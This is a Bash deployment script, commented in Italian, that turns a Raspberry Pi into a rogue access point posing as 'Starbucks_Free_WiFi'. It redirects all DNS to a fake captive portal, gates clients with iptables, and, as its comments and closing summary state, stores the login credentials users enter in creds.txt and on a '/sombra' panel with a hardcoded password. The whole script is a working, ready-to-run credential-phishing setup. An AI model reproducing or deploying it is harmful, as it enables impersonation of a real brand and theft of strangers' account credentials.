#!/usr/bin/env bash
#
# setup.sh - Raspberry Pi 4 (2 GB) captive portal "da zero a funzionante"
#
# Architettura:
#   Internet <-> router WiFi libero <-> [wlan0 STA] Raspberry Pi [ap0 AP] <-> telefono
#
# Il Pi si aggancia alla rete WiFi libera (uplink, niente ethernet) e crea una
# rete AP "affiancata" (ap0). dnsmasq risolve ogni dominio sull'IP del Pi,
# quindi il telefono viene dirottato sul portale (l'app Express, porta 80).
# Al login l'app scrive le credenziali in instance/creds.txt e su /sombra e
# sblocca il cliente via iptables (catena PORTAL_CLIENTS).
#
# Uso:
#   sudo bash pi-portal/setup.sh
#
# Variabili opzionali (esportale prima di lanciare):
#   PORTAL_SSID           SSID della rete AP (default: Starbucks_Free_WiFi)
#   PORTAL_STA_SSID       SSID della rete libera da agganciare (default: PORTAL_SSID)
#   PORTAL_CHANNEL        canale AP (default: auto = stesso canale dell'uplink STA)
#   PORTAL_IP             IP dell'AP (default: 10.3.0.1)
#   PORTAL_SUBNET         subnet AP (default: 10.3.0.0/24)
#   PORTAL_DHCP_START     inizio range DHCP (default: 10.3.0.100)
#   PORTAL_DHCP_END       fine range DHCP (default: 10.3.0.250)
#   PORTAL_WPA_PASSPHRASE se valorizzata protegge l'AP con WPA2 (default: rete aperta)
#   PORTAL_APP_DIR        cartella di installazione dell'app (default: /opt/starbucks-portal)
#   PORTAL_SKIP_APT       =1 salta l'installazione dei pacchetti
#   PORTAL_SKIP_DEPLOY    =1 salta la copia dell'app e npm install
#
set -euo pipefail

# ---------- configurazione ----------
PORTAL_SSID="${PORTAL_SSID:-Starbucks_Free_WiFi}"
PORTAL_STA_SSID="${PORTAL_STA_SSID:-$PORTAL_SSID}"
PORTAL_CHANNEL="${PORTAL_CHANNEL:-auto}"
PORTAL_IP="${PORTAL_IP:-10.3.0.1}"
PORTAL_SUBNET="${PORTAL_SUBNET:-10.3.0.0/24}"
PORTAL_DHCP_START="${PORTAL_DHCP_START:-10.3.0.100}"
PORTAL_DHCP_END="${PORTAL_DHCP_END:-10.3.0.250}"
PORTAL_WPA_PASSPHRASE="${PORTAL_WPA_PASSPHRASE:-}"
PORTAL_APP_DIR="${PORTAL_APP_DIR:-/opt/starbucks-portal}"
STA_IFACE="wlan0"
AP_IFACE="ap0"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

log()  { echo "[+] $*"; }
warn() { echo "[!] $*"; }
die()  { echo "[x] $*" >&2; exit 1; }

# ---------- preflight ----------
[ "$(id -u)" = 0 ] || die "Esegui con sudo:  sudo bash pi-portal/setup.sh"

if ! grep -qi "raspberry" /proc/device-tree/model 2>/dev/null; then
  warn "Non sembri essere su un Raspberry Pi (model: $(cat /proc/device-tree/model 2>/dev/null || echo '?'))."
  warn "Lo script e' pensato per Pi 4 / Pi 5 con chip CYW43455 (AP+STA su radio singola)."
  read -r -p "Continuo comunque? [s/N] " ans || true
  [ "${ans:-n}" = "s" ] || die "Annullato."
fi

# ---------- 1. pacchetti ----------
if [ "${PORTAL_SKIP_APT:-0}" != "1" ]; then
  log "Installazione pacchetti (hostapd, dnsmasq, iptables, netfilter-persistent)..."
  apt-get update -y
  DEBIAN_FRONTEND=noninteractive apt-get install -y     hostapd dnsmasq iptables netfilter-persistent iw wireless-tools curl
fi

if ! command -v node >/dev/null 2>&1; then
  log "Installazione Node.js..."
  DEBIAN_FRONTEND=noninteractive apt-get install -y nodejs npm
fi
NODE_MAJOR="$(node -e 'console.log(process.versions.node.split(".")[0])' 2>/dev/null || echo 0)"
if [ "$NODE_MAJOR" -lt 18 ] 2>/dev/null; then
  die "Node.js troppo vecchio ($(node -v)); serve >= 18 (l'app usa Express 5)."
fi

# ---------- 2. deploy dell'app ----------
if [ "${PORTAL_SKIP_DEPLOY:-0}" != "1" ]; then
  log "Deploy dell'app in $PORTAL_APP_DIR ..."
  mkdir -p "$PORTAL_APP_DIR"
  cp -r "$REPO_DIR/app.js" "$REPO_DIR/views" "$REPO_DIR/public"         "$REPO_DIR/package.json" "$REPO_DIR/package-lock.json" "$PORTAL_APP_DIR/"
  cp -r "$REPO_DIR/pi-portal" "$PORTAL_APP_DIR/"
  ( cd "$PORTAL_APP_DIR" && npm install --omit=dev --no-audit --no-fund )
  chown -R root:root "$PORTAL_APP_DIR"
fi

# ---------- 3. uplink STA (rete libera, senza password) ----------
WPA_CONF="/etc/wpa_supplicant/wpa_supplicant-wlan0.conf"
if [ ! -f "$WPA_CONF" ]; then
  log "Configuro l'uplink STA su $STA_IFACE (rete: $PORTAL_STA_SSID, aperta)..."
  cat > "$WPA_CONF" <<WPAEOF
ctrl_interface=DIR=/var/run/wpa_supplicant
update_config=1

network={
    ssid="$PORTAL_STA_SSID"
    key_mgmt=NONE
}
WPAEOF
  chmod 600 "$WPA_CONF"
  systemctl enable wpa_supplicant@wlan0.service >/dev/null 2>&1 || true
  systemctl restart wpa_supplicant@wlan0.service >/dev/null 2>&1 || true
  warn "Attendo che wlan0 si agganci (max 30s)..."
  for i in $(seq 1 30); do
    if iw dev "$STA_IFACE" link 2>/dev/null | grep -q Connected; then break; fi
    sleep 1
  done
else
  warn "Trovata configurazione wpa_supplicant esistente ($WPA_CONF): la lascio intatta."
fi

# ---------- 4. canale AP (radio singola: stesso canale dell'uplink) ----------
if [ "$PORTAL_CHANNEL" = "auto" ]; then
  STA_CH="$(iw dev "$STA_IFACE" info 2>/dev/null | awk '/channel/ {print $2; exit}')"
  case "$STA_CH" in
    ''|*[!0-9]*) STA_CH="";;
  esac
  if [ -n "$STA_CH" ]; then
    PORTAL_CHANNEL="$STA_CH"
    log "Uplink su canale $STA_CH: uso lo stesso canale per l'AP (radio singola)."
  else
    PORTAL_CHANNEL="6"
    warn "Canale uplink non rilevato: uso il canale 6. (PORTAL_CHANNEL per forzare)"
  fi
fi

# ---------- 5. interfaccia ap0 ----------
log "Creo l'interfaccia virtuale $AP_IFACE su $STA_IFACE..."
iw dev "$STA_IFACE" interface add "$AP_IFACE" type __ap 2>/dev/null ||   warn "$AP_IFACE esiste gia' o non creabile ora (ci pensera' create-ap0.service al boot)."
ip link set "$AP_IFACE" up 2>/dev/null || true

install -m 644 "$SCRIPT_DIR/systemd/create-ap0.service" /etc/systemd/system/
systemctl daemon-reload
systemctl enable create-ap0.service >/dev/null 2>&1 || true
systemctl restart create-ap0.service >/dev/null 2>&1 || true

# ---------- 6. hostapd ----------
log "Configuro hostapd (SSID: $PORTAL_SSID, canale: $PORTAL_CHANNEL)..."
{
  echo "interface=$AP_IFACE"
  echo "driver=nl80211"
  echo "ssid=$PORTAL_SSID"
  echo "hw_mode=g"
  echo "channel=$PORTAL_CHANNEL"
  echo "wmm_enabled=0"
  echo "macaddr_acl=0"
  echo "auth_algs=1"
  echo "ignore_broadcast_ssid=0"
  if [ -n "$PORTAL_WPA_PASSPHRASE" ]; then
    echo "wpa=2"
    echo "wpa_passphrase=$PORTAL_WPA_PASSPHRASE"
    echo "wpa_key_mgmt=WPA-PSK"
    echo "rsn_pairwise=CCMP"
  fi
} > /etc/hostapd/hostapd-portal.conf
chmod 600 /etc/hostapd/hostapd-portal.conf

install -m 644 "$SCRIPT_DIR/systemd/hostapd-portal.service" /etc/systemd/system/
systemctl daemon-reload
systemctl enable hostapd-portal.service >/dev/null 2>&1 || true
systemctl restart hostapd-portal.service || warn "hostapd non partito: guarda 'journalctl -u hostapd-portal'"

# ---------- 7. dnsmasq (DNS + DHCP su ap0, tutto -> IP del Pi) ----------
log "Configuro dnsmasq (subnet $PORTAL_SUBNET, ogni dominio -> $PORTAL_IP)..."
{
  echo "interface=$AP_IFACE"
  echo "bind-interfaces"
  echo "dhcp-range=$PORTAL_DHCP_START,$PORTAL_DHCP_END,12h"
  echo "dhcp-option=option:router,$PORTAL_IP"
  echo "dhcp-option=option:dns-server,$PORTAL_IP"
  echo "address=/#/$PORTAL_IP"
  echo "no-resolv"
} > /etc/dnsmasq.d/starbucks-portal.conf

# dhcpcd non deve gestire ap0 (lo fa dnsmasq)
if [ -f /etc/dhcpcd.conf ] && ! grep -q "denyinterfaces $AP_IFACE" /etc/dhcpcd.conf; then
  echo "denyinterfaces $AP_IFACE" >> /etc/dhcpcd.conf
fi

systemctl enable dnsmasq.service >/dev/null 2>&1 || true
systemctl restart dnsmasq.service || warn "dnsmasq non partito: guarda 'journalctl -u dnsmasq'"

# ---------- 8. iptables: NAT + gating (PORTAL_CLIENTS) ----------
log "Configuro iptables (NAT verso $STA_IFACE + gating client)..."
sysctl -w net.ipv4.ip_forward=1 >/dev/null
grep -q "^net.ipv4.ip_forward=1" /etc/sysctl.conf || echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf

iptables -t nat -C POSTROUTING -o "$STA_IFACE" -j MASQUERADE 2>/dev/null ||   iptables -t nat -A POSTROUTING -o "$STA_IFACE" -j MASQUERADE

# risposte di connessioni gia' stabilite: sempre permesse
iptables -C FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT 2>/dev/null ||   iptables -I FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT

# catena di gating: i client partono bloccati (DROP), l'app inserisce ACCEPT per IP al login
iptables -N PORTAL_CLIENTS 2>/dev/null || iptables -F PORTAL_CLIENTS
iptables -A PORTAL_CLIENTS -j DROP
iptables -C FORWARD -i "$AP_IFACE" -j PORTAL_CLIENTS 2>/dev/null ||   iptables -A FORWARD -i "$AP_IFACE" -j PORTAL_CLIENTS

netfilter-persistent save >/dev/null 2>&1 || iptables-save > /etc/iptables/rules.v4 || true

# ---------- 9. unit dell'app ----------
log "Installazione unit dell'app (porta 80, PORTAL_GRANT=1)..."
cat > /etc/starbucks-portal.env <<ENVEOF
PORT=80
PORTAL_GRANT=1
PORTAL_HOSTS=$PORTAL_IP
PORTAL_REDIRECT_BASE=http://$PORTAL_IP
PORTAL_CHAIN=PORTAL_CLIENTS
ENVEOF
chmod 600 /etc/starbucks-portal.env

install -m 644 "$SCRIPT_DIR/systemd/starbucks-portal.service" /etc/systemd/system/
install -m 644 "$SCRIPT_DIR/systemd/portal-passthrough.service" /etc/systemd/system/
install -m 644 "$SCRIPT_DIR/systemd/portal-passthrough.timer" /etc/systemd/system/
install -m 755 "$SCRIPT_DIR/scripts/portal-check.sh" "$PORTAL_APP_DIR/pi-portal/scripts/portal-check.sh"

systemctl daemon-reload
systemctl enable starbucks-portal.service >/dev/null 2>&1 || true
systemctl enable portal-passthrough.timer >/dev/null 2>&1 || true
systemctl restart starbucks-portal.service || warn "app non partita: guarda 'journalctl -u starbucks-portal'"
systemctl start portal-passthrough.timer >/dev/null 2>&1 || true

# ---------- 10. riepilogo ----------
echo
echo "======================================================================"
echo " SETUP COMPLETATO"
echo "======================================================================"
echo "  AP      : $PORTAL_SSID (canale $PORTAL_CHANNEL, subnet $PORTAL_SUBNET)"
echo "  Portale : http://$PORTAL_IP  (host sconosciuti -> redirect qui)"
echo "  Sombra  : http://$PORTAL_IP/sombra  (login: sombr4 / sombr4)"
echo "  Log     : journalctl -u starbucks-portal -f"
echo "  Creds   : $PORTAL_APP_DIR/instance/creds.txt"
echo
echo " PROSSIMI PASSI:"
echo "  1. Se il router WiFi ha un captive portal (email/password/Google/Apple),"
echo "     il Pi resta bloccato finche' non completi il login manuale."
echo "     Segui pi-portal/instruction.md (o /opt/starbucks-portal/pi-portal/instruction.md)."
echo "  2. Collega il telefono alla rete '$PORTAL_SSID': dovrebbe aprirsi il portale."
echo "  3. Dopo il login il telefono viene sbloccato e le credenziali finiscono"
echo "     in creds.txt e su /sombra."
echo "======================================================================"
